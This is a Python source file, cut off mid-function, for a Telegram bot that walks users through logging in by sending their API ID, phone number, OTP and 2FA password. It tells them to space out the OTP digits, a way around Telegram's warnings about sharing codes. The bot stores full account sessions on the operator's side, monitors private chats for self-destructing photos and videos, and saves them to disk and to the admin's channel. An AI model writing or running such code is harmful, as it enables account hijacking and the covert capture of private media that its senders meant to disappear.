# -*- coding:utf-8 -*-

import asyncio
import json
import logging
import os
import random
import string
import time
import zipfile
import aiofiles
import aiohttp
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, DownloadColumn, TransferSpeedColumn, TimeRemainingColumn
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import FloodWaitError
from telethon.errors import UserIsBlockedError, PeerIdInvalidError

# Define and create necessary directories
all_media_dir = "Media"
if not os.path.exists(all_media_dir):
    os.makedirs(all_media_dir)

# Configure logging
formatter = logging.Formatter("%(asctime)s - %(levelname)s - %(message)s")
log_handler = logging.StreamHandler()
log_handler.setFormatter(formatter)
log_handler.setLevel(logging.INFO)
logger = logging.getLogger()
logger.setLevel(logging.INFO)
logger.addHandler(log_handler)

console = Console()
SETTINGS_FILE = "settings.json"
STATE_FILE = "bot_state.json"
SESSIONS_DIR = "user_sessions"
if not os.path.exists(SESSIONS_DIR):
    os.makedirs(SESSIONS_DIR)

# Store bot credentials globally for skip function
BOT_API_ID = None
BOT_API_HASH = None
# Store active user clients
ACTIVE_USER_CLIENTS = {}


async def load_config():
    """Load configuration from settings file"""
    if os.path.exists(SETTINGS_FILE):
        async with aiofiles.open(SETTINGS_FILE, mode="r") as file:
            settings = json.loads(await file.read())
        api_id = settings.get("api_id")
        api_hash = settings.get("api_hash")
        admin_id = settings.get("admin_id")
        bot_token = settings.get("bot_token", "")
        session_name = settings.get("session_name", "self_destruct")
        channel_id = settings.get("channel_id")
        
        # Store globally for skip function
        global BOT_API_ID, BOT_API_HASH
        BOT_API_ID = api_id
        BOT_API_HASH = api_hash
        
        return api_id, api_hash, admin_id, bot_token, session_name, channel_id
    
    return await create_new_config()


async def create_new_config():
    """Create new configuration file"""
    console.print("[yellow]No configuration found. Let's create one.[/yellow]")
    
    console.print("\n[cyan]=== Bot Configuration ===[/cyan]")
    console.print("This bot will only use Bot Token for login.")
    console.print("Users can login with their own accounts using /login command.")
    
    api_id = input("Enter your API_ID: ").strip()
    api_hash = input("Enter your API_HASH: ").strip()
    bot_token = input("Enter your Bot Token: ").strip()
    admin_id = input("Enter the Admin ID: ").strip()
    channel_id = input("Enter the Channel ID where files should be saved (e.g., -1001234567890): ").strip()
    session_name = input("Enter session name for bot (default: 'self_destruct'): ").strip()
    
    if not session_name:
        session_name = "self_destruct"
    
    settings = {
        "api_id": api_id,
        "api_hash": api_hash,
        "admin_id": admin_id,
        "bot_token": bot_token,
        "session_name": session_name,
        "channel_id": channel_id
    }
    
    async with aiofiles.open(SETTINGS_FILE, mode="w") as file:
        await file.write(json.dumps(settings, indent=4))
    
    console.print("\n[green]Configuration saved![/green]")
    
    # Store globally for skip function
    global BOT_API_ID, BOT_API_HASH
    BOT_API_ID = api_id
    BOT_API_HASH = api_hash
    
    return api_id, api_hash, admin_id, bot_token, session_name, channel_id


async def update_channel_id(new_channel_id):
    """Update channel ID in settings file"""
    if os.path.exists(SETTINGS_FILE):
        async with aiofiles.open(SETTINGS_FILE, mode="r") as file:
            settings = json.loads(await file.read())
        
        settings["channel_id"] = new_channel_id
        
        async with aiofiles.open(SETTINGS_FILE, mode="w") as file:
            await file.write(json.dumps(settings, indent=4))
        
        return True
    return False


async def load_state():
    """Load bot state from file"""
    if os.path.exists(STATE_FILE):
        async with aiofiles.open(STATE_FILE, mode="r") as file:
            return json.loads(await file.read())
    return {"letter_counter": 0, "user_folders": {}, "user_sessions": {}, "login_sessions": {}}


async def save_state(state):
    """Save bot state to file"""
    async with aiofiles.open(STATE_FILE, mode="w") as file:
        await file.write(json.dumps(state, indent=4))


def get_user_session_file(user_id):
    """Get session file path for a user"""
    return os.path.join(SESSIONS_DIR, f"user_{user_id}.session")


class RichDownloadProgress:
    """Enhanced progress bar for downloads"""
    def __init__(self, filename, total_size):
        self.filename = filename
        self.total_size = total_size
        self.progress = Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            DownloadColumn(),
            TransferSpeedColumn(),
            TimeRemainingColumn(),
            console=console
        )
        self.task = self.progress.add_task(f"[cyan]Downloading {filename}", total=total_size)
        self.progress.start()
    
    def update(self, downloaded):
        self.progress.update(self.task, completed=downloaded)
    
    def close(self):
        self.progress.stop()

async def is_admin(event, admin_id):
    """Check if sender is admin"""
    if admin_id is None:
        return False

    try:
        return event.sender_id == int(admin_id)
    except Exception:
        return False

async def safe_notify(bot_client, user_id, text):
    """
    Safely notify a user.
    If bot cannot DM user, silently ignore.
    """
    try:
        await bot_client.send_message(
            user_id,
            text,
            silent=True
        )

    except (UserIsBlockedError, PeerIdInvalidError):
        # User blocked bot OR never started bot
        return

    except ValueError as e:
        # Entity not found (VERY COMMON)
        if "Could not find the input entity" in str(e):
            return

    except FloodWaitError as e:
        logger.warning(f"FloodWait {e.seconds}s while notifying {user_id}")

    except Exception as e:
        logger.debug(f"safe_notify skipped for {user_id}: {e}")


async def handle_start(event, admin_id):
    """Handle /start command"""
    if event.is_private:
        welcome_message = (
            "🤖 **Welcome to Self-Destructing Media Downloader Bot!**\n\n"
            "This bot can download media files and save them to a channel.\n\n"
            "**Features:**\n"
            "• Download photos, videos, documents\n"
            "• Send files to configured channel\n"
            "• Organized file storage\n"
            "• Progress tracking\n\n"
            "**For Admin:**\n"
            "Use /help to see all available commands.\n\n"
            "**For Users:**\n"
            "To use your own account, use /login command.\n"
            "This will allow you to download media from your own chats.\n\n"
            "**For Self-Destructing Media:**\n"
            "1. Use /login to login with your own account\n"
            "2. When you receive self-destructing media in your account\n"
            "3. Bot will automatically save it and send to channel\n\n"
            "Enjoy using the bot!"
        )
        await event.reply(welcome_message, parse_mode='markdown')


async def handle_login(event, admin_id, bot_client, state):
    """Handle /login command for user session login"""
    if not event.is_private:
        await event.reply("❌ Please use this command in private chat.")
        return
    
    user_id = event.sender_id
    user_session_file = get_user_session_file(user_id)
    
    # Check if user already has a session
    if os.path.exists(user_session_file) and str(user_id) in state.get("user_sessions", {}):
        await event.reply(
            "✅ You are already logged in!\n"
            "You can now receive and save self-destructing media from your account.\n\n"
            "To logout, use /logout command."
        )
        return
    
    # Start login process - Step 1
    message = (
        "**1. Send Your API ID.**\n\n"
        "Click On /skip To Skip This Process\n\n"
        "**NOTE :- If You Skip This Then Your Account Ban Chance Is High.**\n\n"
        "To get API ID and API HASH, visit: https://my.telegram.org"
    )
    
    # Initialize login session
    if "login_sessions" not in state:
        state["login_sessions"] = {}
    
    state["login_sessions"][str(user_id)] = {
        "step": "api_id",
        "api_id": None,
        "api_hash": None,
        "phone": None,
        "phone_code_hash": None,
        "temp_client": None
    }
    
    await save_state(state)
    await event.reply(message, parse_mode='markdown')


async def handle_skip(event, admin_id, state):
    """Handle /skip command during login"""
    if not event.is_private:
        return
    
    user_id = event.sender_id
    user_data = state.get("login_sessions", {}).get(str(user_id))
    
    if not user_data:
        await event.reply("❌ No login session found. Please start with /login command.")
        return
    
    if user_data.get("step") != "api_id":
        await event.reply("❌ Cannot skip at this step.")
        return
    
    # Skip API ID - use bot's API ID
    global BOT_API_ID, BOT_API_HASH
    if BOT_API_ID is None or BOT_API_HASH is None:
        # Load config if not loaded
        BOT_API_ID, BOT_API_HASH, _, _, _, _ = await load_config()
    
    state["login_sessions"][str(user_id)]["api_id"] = BOT_API_ID
    state["login_sessions"][str(user_id)]["api_hash"] = BOT_API_HASH
    state["login_sessions"][str(user_id)]["step"] = "phone"
    await save_state(state)
    
    await event.reply(
        "⚠️ **Warning:** Using bot's API credentials may increase ban risk!\n\n"
        "**3. Please send your phone number which includes country code**\n"
        "Example: +13124562345, +9171828181889\n\n"
        "Enter /cancel to cancel the process"
    )


async def handle_api_id(event, admin_id, state):
    """Handle API ID input"""
    if not event.is_private:
        return
    
    user_id = event.sender_id
    user_data = state.get("login_sessions", {}).get(str(user_id))
    
    if not user_data or user_data.get("step") != "api_id":
        return
    
    text = event.text.strip()
    
    # Check if user wants to cancel
    if text.lower() == "/cancel":
        await handle_cancel(event, admin_id, state)
        return
    
    # Check if user wants to skip
    if text.lower() == "/skip":
        await handle_skip(event, admin_id, state)
        return
    
    # Try to parse as integer
    try:
        api_id = int(text)
        
        # Validate API ID (should be a positive integer)
        if api_id <= 0:
            await event.reply("❌ API ID must be a positive number.\nExample: `1234567`\nEnter /cancel to cancel", parse_mode='markdown')
            return
        
        # Store in state
        state["login_sessions"][str(user_id)]["api_id"] = api_id
        state["login_sessions"][str(user_id)]["step"] = "api_hash"
        await save_state(state)
        
        await event.reply(
            "✅ **API ID saved!**\n\n"
            "**2. Now Send Me Your API HASH**\n\n"
            "Enter /cancel to cancel the process\n"
            "Example: `a1b2c3d4e5f67890abcdef1234567890`"
        )
        
    except ValueError:
        await event.reply("❌ Invalid API_ID. Please send a valid number.\nExample: `1234567`\nEnter /cancel to cancel", parse_mode='markdown')


async def handle_api_hash(event, admin_id, state):
    """Handle API Hash input"""
    if not event.is_private:
        return
    
    user_id = event.sender_id
    user_data = state.get("login_sessions", {}).get(str(user_id))
    
    if not user_data or user_data.get("step") != "api_hash":
        await event.reply("❌ Please complete previous steps first.")
        return
    
    text = event.text.strip()
    
    # Check if user wants to cancel
    if text.lower() == "/cancel":
        await handle_cancel(event, admin_id, state)
        return
    
    # The text is the API hash
    api_hash = text
    
    # Update state
    state["login_sessions"][str(user_id)]["api_hash"] = api_hash
    state["login_sessions"][str(user_id)]["step"] = "phone"
    await save_state(state)
    
    await event.reply(
        "**3. Please send your phone number which includes country code**\n"
        "Example: +13124562345, +9171828181889\n\n"
        "Enter /cancel to cancel the process"
    )


async def handle_phone(event, admin_id, state, bot_client):
    """Handle phone number input"""
    if not event.is_private:
        return
    
    user_id = event.sender_id
    user_data = state.get("login_sessions", {}).get(str(user_id))
    
    if not user_data or user_data.get("step") != "phone":
        await event.reply("❌ Please complete previous steps first.")
        return
    
    text = event.text.strip()
    
    # Check if user wants to cancel
    if text.lower() == "/cancel":
        await handle_cancel(event, admin_id, state)
        return
    
    phone = text
    
    # Validate phone format
    if not phone.startswith('+'):
        await event.reply("❌ Phone number must start with country code (e.g., +1, +91)\nExample: `+1234567890`", parse_mode='markdown')
        return
    
    try:
        api_id = user_data["api_id"]
        api_hash = user_data["api_hash"]
        
        # Create a unique session for this user
        session = StringSession()
        user_client = TelegramClient(session, api_id, api_hash)
        
        # Store in state
        state["login_sessions"][str(user_id)]["phone"] = phone
        state["login_sessions"][str(user_id)]["step"] = "code"
        await save_state(state)
        
        # Send code request
        await user_client.connect()
        sent_code = await user_client.send_code_request(phone)
        
        # Save session string to state (this is serializable)
        session_string = user_client.session.save()
        state["login_sessions"][str(user_id)]["session_string"] = session_string
        state["login_sessions"][str(user_id)]["phone_code_hash"] = sent_code.phone_code_hash
        await save_state(state)
        
        # Disconnect the client for now
        await user_client.disconnect()
        
        await event.reply(
            "**4. Sending OTP...**\n\n"
            "**5. Please check for an OTP in official telegram account. If you got it, send OTP here after reading the below format.**\n\n"
            "If OTP is 12345, please send it as `1 2 3 4 5`.\n\n"
            "Enter /cancel to cancel The Process"
        )
        
    except Exception as e:
        error_msg = str(e).lower()
        if "phone" in error_msg and "invalid" in error_msg:
            await event.reply("❌ Invalid phone number. Please check and try again.\nExample: `+1234567890`", parse_mode='markdown')
        elif "flood" in error_msg:
            await event.reply("❌ Too many attempts. Please wait before trying again.")
        else:
            await event.reply(f"❌ Error: {str(e)}")
        
        # Clean up
        if str(user_id) in state["login_sessions"]:
            del state["login_sessions"][str(user_id)]
        await save_state(state)


async def handle_code(event, admin_id, state):
    """Handle verification code input"""
    if not event.is_private:
        return
    
    user_id = event.sender_id
    user_data = state.get("login_sessions", {}).get(str(user_id))
    
    if not user_data or user_data.get("step") != "code":
        await event.reply("❌ Please complete previous steps first.")
        return
    
    # Check if user wants to cancel
    if event.text.lower() == "/cancel":
        await handle_cancel(event, admin_id, state)
        return
    
    # Extract code (remove spaces if user sent with spaces)
    code = event.text.strip().replace(' ', '')
    
    if not code.isdigit():
        await event.reply("❌ Invalid OTP format. Please send only numbers.\nExample: `1 2 3 4 5` or `12345`", parse_mode='markdown')
        return
    
    if len(code) < 4 or len(code) > 6:
        await event.reply("❌ OTP should be 4-6 digits. Please check and try again.")
        return
    
    try:
        phone = user_data["phone"]
        phone_code_hash = user_data["phone_code_hash"]
        session_string = user_data.get("session_string")
        
        if not session_string:
            await event.reply("❌ Session data missing. Please restart login with /login")
            return
        
        # Recreate client from session string
        session = StringSession(session_string)
        user_client = TelegramClient(
            session,
            user_data["api_id"],
            user_data["api_hash"]
        )
        
        await user_client.connect()
        
        # Try to sign in
        try:
            await user_client.sign_in(
                phone=phone,
                code=code,
                phone_code_hash=phone_code_hash
            )
            
            # Login successful
            await complete_user_login(event, user_id, user_client, state)
            
        except Exception as e:
            error_msg = str(e).lower()
            # Check if 2FA is required
            if "two-steps" in error_msg or "2fa" in error_msg or "password" in error_msg:
                # Save updated session string
                new_session_string = user_client.session.save()
                state["login_sessions"][str(user_id)]["session_string"] = new_session_string
                state["login_sessions"][str(user_id)]["step"] = "2fa"
                await save_state(state)
                
                await event.reply(
                    "**6. Your account has enabled two-step verification. Please provide the password.**\n\n"
                    "Enter /cancel to cancel The Process"
                )
                await user_client.disconnect()
            else:
                # Invalid code
                if "code" in error_msg and "invalid" in error_msg:
                    await event.reply("❌ Invalid OTP. Please check and try again.\nIf OTP is 12345, send as `1 2 3 4 5`", parse_mode='markdown')
                elif "code" in error_msg and "expired" in error_msg:
                    await event.reply("❌ OTP expired. Please restart login process with /login")
                    # Clean up
                    if str(user_id) in state["login_sessions"]:
                        del state["login_sessions"][str(user_id)]
                    await save_state(state)
                else:
                    await event.reply(f"❌ Error: {str(e)}")
                
                await user_client.disconnect()
        
    except Exception as e:
        await event.reply(f"❌ Error: {str(e)}")
        if 'user_client' in locals():
            try:
                await user_client.disconnect()
            except:
                pass


async def handle_2fa(event, admin_id, state):
    """Handle 2FA password input"""
    if not event.is_private:
        return
    
    user_id = event.sender_id
    user_data = state.get("login_sessions", {}).get(str(user_id))
    
    if not user_data or user_data.get("step") != "2fa":
        await event.reply("❌ Please complete previous steps first.")
        return
    
    # Check if user wants to cancel
    if event.text.lower() == "/cancel":
        await handle_cancel(event, admin_id, state)
        return
    
    password = event.text.strip()
    
    if not password:
        await event.reply("❌ Please provide your 2FA password.\nEnter /cancel to cancel", parse_mode='markdown')
        return
    
    try:
        session_string = user_data.get("session_string")
        
        if not session_string:
            await event.reply("❌ Session data missing. Please restart login with /login")
            return
        
        # Recreate client from session string
        session = StringSession(session_string)
        user_client = TelegramClient(
            session,
            user_data["api_id"],
            user_data["api_hash"]
        )
        
        await user_client.connect()
        
        # Complete sign in with 2FA
        await user_client.sign_in(password=password)
        
        # Login successful
        await complete_user_login(event, user_id, user_client, state)
        
    except Exception as e:
        error_msg = str(e).lower()
        if "password" in error_msg and "invalid" in error_msg:
            await event.reply("❌ Invalid 2FA password. Please try again.")
        else:
            await event.reply(f"❌ Error: {str(e)}")
        
        if 'user_client' in locals():
            try:
                await user_client.disconnect()
            except:
                pass


async def setup_user_client_handlers(user_client, user_id, bot_client, state):
    """Setup event handlers for user client to catch self-destructing media"""

    @user_client.on(events.NewMessage(func=lambda e: e.is_private))
    async def user_media_handler(event):
        try:
            # 🚫 Ignore outgoing messages
            if event.out:
                return

            # 🚫 Ignore empty/service messages
            if not event.message or not event.media:
                return

            msg = event.message

            # ✅ FULL TTL DETECTION (ALL REAL CASES)
            ttl = None

            if msg.media:
                ttl = (
                    getattr(msg.media, "ttl_seconds", None)
                    or getattr(getattr(msg.media, "photo", None), "ttl_seconds", None)
                    or getattr(getattr(msg.media, "document", None), "ttl_seconds", None)
                )

            # ❌ Ignore normal media
            if not ttl:
                return

            # ✅ CRITICAL: DOWNLOAD FIRST (NO DELAY)
            await user_downloader(
                event,
                user_client,
                bot_client,
                all_media_dir,
                state
            )

            # 🟢 OPTIONAL: log AFTER successful download
            console.print(
                f"[magenta]SELF-DESTRUCTING MEDIA SAVED "
                f"(TTL={ttl}) for user {user_id}[/magenta]"
            )

        except Exception as e:
            logger.debug(f"User media handler skipped for {user_id}: {e}")

async def complete_user_login(event, user_id, user_client, state):
    """Complete user login process"""
    try:
        # Get user info
        me = await user_client.get_me()
        
        # Save session to file
        session_string = user_client.session.save()
        user_session_file = get_user_session_file(user_id)
        
        async with aiofiles.open(user_session_file, mode="w") as f:
            await f.write(session_string)
        
        # Update state
        if "user_sessions" not in state:
            state["user_sessions"] = {}
        
        state["user_sessions"][str(user_id)] = {
            "api_id": user_client.api_id,
            "api_hash": user_client.api_hash,
            "username": me.username,
            "phone": me.phone,
            "first_name": me.first_name,
            "last_name": me.last_name,
            "session_file": user_session_file,
            "login_time": time.time()
        }
        
        # Clean up login session
        if "login_sessions" in state and str(user_id) in state["login_sessions"]:
            del state["login_sessions"][str(user_id)]
        
        await save_state(state)
        
        # Get bot client (we'll store it in global variable from main)
        global BOT_CLIENT
        if BOT_CLIENT:
            # Setup handlers for user client
            await setup_user_client_handlers(user_client, user_id, BOT_CLIENT, state)
        
        # Store user client in global dictionary
        global ACTIVE_USER_CLIENTS
        ACTIVE_USER_CLIENTS[str(user_id)] = user_client
        
        # Start the user client in background
        await user_client.start()
        
        # Send welcome message
        welcome_msg = (
            f"✅ **Login Successful!**\n\n"
            f"👤 **Account Details:**\n"
            f"• Name: {me.first_name} {me.last_name if me.last_name else ''}\n"
            f"• Username: @{me.username if me.username else 'Not set'}\n"
            f"• Phone: {me.phone}\n"
            f"• User ID: {me.id}\n\n"
            f"📱 **Now you can:**\n"
            f"• Self-destructing media will be automatically saved\n"
            f"• Files will be saved in organized folders\n"
            f"• Files will be sent to configured channel\n"
            f"• Use /mystatus to check your session\n"
            f"• Use /logout to logout\n\n"
            f"⚠️ **Important:**\n"
            f"• Bot will monitor your private messages for self-destructing media\n"
            f"• Only media in private chats will be processed\n"
            f"• Your session is stored securely"
        )
        
        await event.reply(welcome_msg, parse_mode='markdown')
        
    except Exception as e:
        await event.reply(f"❌ Error completing login: {str(e)}")
        
        # Clean up on error
        if str(user_id) in state.get("login_sessions", {}):
            try:
                await user_client.disconnect()
            except:
                pass
            del state["login_sessions"][str(user_id)]
            await save_state(state)


async def user_downloader(event, user_client, bot_client, all_media_dir, state):
    """Download media from user's account and send to channel"""
    try:
        # Get sender info
        try:
            sender = await event.get_sender()
            username = sender.username if sender.username else "NoUsername"
            user_id = sender.id if sender.id else "Unknown"
        except:
            username = "Unknown"
            user_id = "Unknown"

        # Find existing folder or create new one
        user_folder_key = f"{username}_{user_id}"

        if user_folder_key in state["user_folders"]:
            user_folder_name = state["user_folders"][user_folder_key]
        else:
            counter = state["letter_counter"]
            letter = string.ascii_uppercase[counter % 26]
            user_folder_name = f"{counter:02d} - {letter} - @{username} - {user_id}"
            state["user_folders"][user_folder_key] = user_folder_name
            state["letter_counter"] += 1
            await save_state(state)

        user_folder_path = os.path.join(all_media_dir, user_folder_name)
        os.makedirs(user_folder_path, exist_ok=True)

        # Generate unique filename
        timestamp = int(time.time())
        random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))

        # Determine file type and extension
        if event.photo:
            file_ext = ".jpg"
            media_type = "photo"
        elif event.video:
            file_ext = ".mp4"
            media_type = "video"
        elif event.document:
            if hasattr(event.document, 'attributes') and event.document.attributes:
                for attr in event.document.attributes:
                    if hasattr(attr, 'file_name') and attr.file_name:
                        file_ext = os.path.splitext(attr.file_name)[1]
                        break
                else:
                    file_ext = ".bin"
            else:
                file_ext = ".bin"
            media_type = "document"
        elif event.audio:
            file_ext = ".mp3"
            media_type = "audio"
        elif event.voice:
            file_ext = ".ogg"
            media_type = "voice"
        elif event.video_note:
            file_ext = ".mp4"
            media_type = "video_note"
        else:
            file_ext = ".bin"
            media_type = "unknown"

        filename = f"{timestamp}_{random_str}{file_ext}"
        file_path = os.path.join(user_folder_path, filename)

        # Download with progress
        file_size = event.file.size if event.file else 0
        console.print(f"[cyan]File size: {file_size} bytes[/cyan]")

        progress = RichDownloadProgress(filename, file_size) if file_size > 0 else None

        await event.download_media(
            file=file_path,
            progress_callback=lambda c, t: progress.update(c) if progress else None
        )

        if progress:
            progress.close()

        # Verify save
        if not os.path.exists(file_path):
            console.print("[red]ERROR: File was not saved[/red]")
            return

        actual_size = os.path.getsize(file_path)
        file_size_mb = actual_size / (1024 * 1024) if actual_size > 0 else 0

        console.print(
            f"[green]✓ Downloaded {media_type} ({file_size_mb:.2f} MB) → {filename}[/green]"
        )
        logger.info(
            f"Downloaded {media_type} ({file_size_mb:.2f} MB) from user {username} → {filename}"
        )

        # Send to channel if configured (SILENT)
        channel_id = getattr(bot_client, "channel_id", None)
        if channel_id:
            try:
                success = await send_to_channel(bot_client, file_path, username, channel_id)
                if not success:
                    logger.warning(f"File saved but failed to send to channel: {filename}")
            except Exception as e:
                logger.error(f"Channel upload error: {e}")

    except Exception as e:
        console.print(f"[red]Error in user_downloader: {e}[/red]")
        logger.error(f"User downloader error: {e}")

async def handle_cancel(event, admin_id, state):
    """Handle /cancel command during login"""
    if not event.is_private:
        return
    
    user_id = event.sender_id
    
    # Check if user is in login process
    if str(user_id) not in state.get("login_sessions", {}):
        await event.reply("❌ No active login session to cancel.")
        return
    
    # Remove login session
    del state["login_sessions"][str(user_id)]
    await save_state(state)
    
    await event.reply("❌ Login process cancelled.")


async def handle_logout(event, admin_id, state):
    """Handle /logout command"""
    if not event.is_private:
        await event.reply("❌ Please use this command in private chat.")
        return
    
    user_id = event.sender_id
    
    # Check if user has a session
    if str(user_id) not in state.get("user_sessions", {}):
        await event.reply("❌ You are not logged in.")
        return
    
    # Remove session file
    user_session_file = get_user_session_file(user_id)
    if os.path.exists(user_session_file):
        os.remove(user_session_file)
    
    # Remove from state
    if "user_sessions" in state and str(user_id) in state["user_sessions"]:
        del state["user_sessions"][str(user_id)]
    
    # Disconnect and remove active user client
    global ACTIVE_USER_CLIENTS
    if str(user_id) in ACTIVE_USER_CLIENTS:
        try:
            await ACTIVE_USER_CLIENTS[str(user_id)].disconnect()
        except:
            pass
        del ACTIVE_USER_CLIENTS[str(user_id)]
    
    await save_state(state)
    
    await event.reply("✅ Successfully logged out. Your session has been removed.")


async def handle_mystatus(event, admin_id, state):
    """Handle /mystatus command to show user session status"""
    if not event.is_private:
        await event.reply("❌ Please use this command in private chat.")
        return
    
    user_id = event.sender_id
    user_session = state.get("user_sessions", {}).get(str(user_id))
    
    if not user_session:
        await event.reply(
            "❌ **You are not logged in.**\n\n"
            "To login with your own account:\n"
            "1. Use /login command\n"
            "2. Follow the steps to enter:\n"
            "   - API_ID\n"
            "   - API_HASH\n"
            "   - Phone number\n"
            "   - Verification code\n"
            "   - 2FA password (if enabled)"
        )
        return
    
    # Calculate login duration
    login_time = user_session.get("login_time", time.time())
    duration = time.time() - login_time
    hours = int(duration // 3600)
    minutes = int((duration % 3600) // 60)
    
    await event.reply(
        f"✅ **Logged In**\n\n"
        f"👤 **Account Details:**\n"
        f"• Name: {user_session.get('first_name', 'Unknown')} {user_session.get('last_name', '')}\n"
        f"• Username: @{user_session.get('username', 'Not set')}\n"
        f"• Phone: {user_session.get('phone', 'Unknown')}\n"
        f"• API_ID: {user_session.get('api_id')}\n"
        f"• Logged in for: {hours}h {minutes}m\n\n"
        f"📱 **Status:**\n"
        f"• Self-destructing media monitoring: ✅ Active\n"
        f"• Files will be saved to channel: ✅\n\n"
        f"⚠️ **Security:**\n"
        f"• Use /logout when done\n"
        f"• Session stored securely"
    )


# File management commands
async def handle_files(event, admin_id):
    """List all files in the media folder"""
    if not await is_admin(event, admin_id):
        return
    
    try:
        def list_media_files(directory, max_depth=3, current_depth=0):
            """Recursively list files and folders in media directory with depth limit"""
            if not os.path.isdir(directory):
                return f"The directory {directory} does not exist."
            
            if current_depth > max_depth:
                return ""
            
            # Get relative path from Media folder
            rel_path = os.path.relpath(directory, all_media_dir)
            if rel_path == ".":
                result = "📁 **Media Folder Structure:**\n\n"
            else:
                folder_name = os.path.basename(directory)
                result = f"{'  ' * (current_depth-1)}└── 📁 {folder_name}\n"
            
            try:
                # List directories first
                items = os.listdir(directory)
                dirs = []
                files = []
                
                for item in items:
                    if item.startswith('.'):
                        continue
                    item_path = os.path.join(directory, item)
                    if os.path.isdir(item_path):
                        dirs.append(item)
                    else:
                        files.append(item)
                
                # Sort alphabetically
                dirs.sort()
                files.sort()
                
                # Add directories
                for dir_name in dirs:
                    dir_path = os.path.join(directory, dir_name)
                    # Count files in directory
                    file_count = sum(len(files) for _, _, files in os.walk(dir_path))
                    result += f"{'  ' * current_depth}📁 {dir_name}/ ({file_count} items)\n"
                    result += list_media_files(dir_path, max_depth, current_depth + 1)
                
                # Add files
                for file_name in files[:50]:  # Limit to 50 files per directory
                    file_path = os.path.join(directory, file_name)
                    try:
                        size = os.path.getsize(file_path)
                        # Format size appropriately
                        if size < 1024:  # Bytes
                            size_str = f" {size}B"
                        elif size < 1024 * 1024:  # KB
                            size_str = f" {size/1024:.1f}KB"
                        else:  # MB or GB
                            if size < 1024 * 1024 * 1024:  # MB
                                size_str = f" {size/(1024*1024):.1f}MB"
                            else:  # GB
                                size_str = f" {size/(1024*1024*1024):.2f}GB"
                        
                        # Get file icon based on extension
                        ext = os.path.splitext(file_name)[1].lower()
                        if ext in ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp']:
                            icon = "🖼️"
                        elif ext in ['.mp4', '.avi', '.mkv', '.mov', '.wmv', '.flv', '.webm']:
                            icon = "🎬"
                        elif ext in ['.mp3', '.wav', '.flac', '.m4a', '.ogg']:
                            icon = "🎵"
                        elif ext in ['.zip', '.rar', '.7z', '.tar', '.gz']:
                            icon = "🗜️"
                        elif ext in ['.txt', '.log', '.md', '.json', '.py', '.js', '.html', '.css']:
                            icon = "📄"
                        else:
                            icon = "📎"
                            
                        result += f"{'  ' * current_depth}{icon} {file_name}{size_str}\n"
                    except:
                        result += f"{'  ' * current_depth}📎 {file_name}\n"
                
                if len(files) > 50:
                    result += f"{'  ' * current_depth}... and {len(files) - 50} more files\n"
                    
            except PermissionError:
                result += f"{'  ' * current_depth}⚠️ Permission denied\n"
            except Exception as e:
                result += f"{'  ' * current_depth}⚠️ Error: {str(e)[:50]}...\n"
            
            return result
        
        # Get statistics
        total_folders = 0
        total_files = 0
        total_size = 0
        
        for root, dirs, files in os.walk(all_media_dir):
            # Skip hidden directories
            dirs[:] = [d for d in dirs if not d.startswith('.')]
            total_folders += len(dirs)
            total_files += len(files)
            
            for file in files:
                if file.startswith('.'):
                    continue
                file_path = os.path.join(root, file)
                try:
                    total_size += os.path.getsize(file_path)
                except:
                    pass
        
        # Format total size
        if total_size < 1024 * 1024:  # KB
            total_size_str = f"{total_size/1024:.1f} KB"
        elif total_size < 1024 * 1024 * 1024:  # MB
            total_size_str = f"{total_size/(1024*1024):.1f} MB"
        else:  # GB
            total_size_str = f"{total_size/(1024*1024*1024):.2f} GB"
        
        files_list = list_media_files(all_media_dir)
        summary = f"\n📊 **Summary:** {total_folders} folders, {total_files} files, {total_size_str}"
        
        # Combine summary with file list
        full_message = files_list + summary
        
        # Split long messages (Telegram has 4096 character limit)
        if len(full_message) > 4000:
            # Send summary first
            await event.reply(f"📁 **Media Folder Overview**{summary}", parse_mode='markdown')
            
            # Then send file list in chunks
            chunks = [files_list[i:i+4000] for i in range(0, len(files_list), 4000)]
            for i, chunk in enumerate(chunks):
                await event.reply(f"**File List (Part {i+1}/{len(chunks)}):**\n```\n{chunk}\n```", parse_mode='markdown')
        else:
            await event.reply(full_message, parse_mode='markdown')
            
    except Exception as e:
        logger.error(f"Error in /files command: {str(e)}")
        await event.reply(f"❌ Error listing files: {str(e)}")


async def handle_check(event, admin_id):
    """Check for new files in media folder"""
    if not await is_admin(event, admin_id):
        return
    
    try:
        def get_recent_files(directory, hours=24):
            """Get files modified in the last specified hours"""
            recent_files = []
            cutoff_time = time.time() - (hours * 3600)
            
            for root, dirs, files in os.walk(directory):
                for file in files:
                    if file.startswith('.'):
                        continue
                    file_path = os.path.join(root, file)
                    try:
                        mtime = os.path.getmtime(file_path)
                        if mtime > cutoff_time:
                            size = os.path.getsize(file_path)
                            size_str = f"{size/1024:.1f} KB" if size < 1024*1024 else f"{size/(1024*1024):.1f} MB"
                            recent_files.append((file_path, mtime, size_str))
                    except:
                        continue
            
            # Sort by modification time (newest first)
            recent_files.sort(key=lambda x: x[1], reverse=True)
            return recent_files
        
        recent_files = get_recent_files(all_media_dir, hours=24)
        
        if recent_files:
            message = "📁 **Recently Modified Files (Last 24 Hours):**\n\n"
            for file_path, mtime, size_str in recent_files[:20]:  # Limit to 20 files
                rel_path = os.path.relpath(file_path, all_media_dir)
                timestamp = time.strftime('%Y-%m-d %H:%M', time.localtime(mtime))
                message += f"• `{rel_path}`\n  📏 {size_str} | 🕒 {timestamp}\n\n"
            
            if len(recent_files) > 20:
                message += f"\n... and {len(recent_files) - 20} more files"
            
            await event.reply(message, parse_mode='markdown')
        else:
            await event.reply("📭 No files modified in the last 24 hours.")
            
    except Exception as e:
        logger.error(f"Error in /check command: {str(e)}")
        await event.reply(f"❌ Error checking files: {str(e)}")


async def handle_download(event, admin_id):
    """Download a specific file"""
    if not await is_admin(event, admin_id):
        return
    
    try:
        # Extract file path from command
        args = event.text.split()
        if len(args) < 2:
            await event.reply("❌ Usage: /download <file_path>\nExample: /download Media/file.jpg")
            return
        
        file_path = ' '.join(args[1:]).strip()
        
        # Check if file exists
        if not os.path.exists(file_path):
            await event.reply(f"❌ File not found: `{file_path}`", parse_mode='markdown')
            return
        
        # Check if it's a directory
        if os.path.isdir(file_path):
